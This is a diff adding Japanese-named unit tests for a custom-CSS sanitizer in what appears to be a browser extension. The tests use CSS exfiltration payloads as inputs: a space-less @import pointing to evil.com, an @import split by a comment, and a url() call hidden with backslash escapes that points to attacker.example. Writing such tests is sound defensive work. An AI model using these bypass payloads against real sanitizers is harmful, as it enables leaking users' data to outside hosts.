@@ -142,5 +142,34 @@ describe('src/content/ui-injector.ts', () => {
     it('空文字列や空入力に対して安全に処理する', () => {
       expect(sanitizeCustomCss('')).toEqual({ safeCss: '', isValid: true, warnings: [] });
     });
+
+    it('無害なユーザーコメントを含む通常 CSS はそのまま保持する', () => {
+      const css = '/* サイドバー非表示 */ nav { display: none; }';
+      const result = sanitizeCustomCss(css);
+      expect(result.isValid).toBe(true);
+      expect(result.safeCss).toBe(css);
+    });
+
+    it('スペースを省略した @import 記法を遮断する', () => {
+      const css = '@import"https://evil.com/leak.css"; body { color: red; }';
+      const result = sanitizeCustomCss(css);
+      expect(result.isValid).toBe(false);
+      expect(result.safeCss).not.toContain('evil.com');
+      expect(result.safeCss).toContain('color: red');
+    });
+
+    it('CSS コメントやバックスラッシュエスケープによるバイパスを検知・遮断する', () => {
+      const obfuscatedImport = '@/*bypass*/import "https://evil.com/a.css"; body { color: green; }';
+      const importResult = sanitizeCustomCss(obfuscatedImport);
+      expect(importResult.isValid).toBe(false);
+      expect(importResult.safeCss).not.toContain('evil.com');
+      expect(importResult.safeCss).toContain('color: green');
+
+      const obfuscatedUrl = 'div { background: u\\72 l("https\\3a //attacker.example/leak"); color: white; }';
+      const urlResult = sanitizeCustomCss(obfuscatedUrl);
+      expect(urlResult.isValid).toBe(false);
+      expect(urlResult.safeCss).not.toContain('attacker.example');
+      expect(urlResult.safeCss).toContain('color: white');
+    });
   });
 });
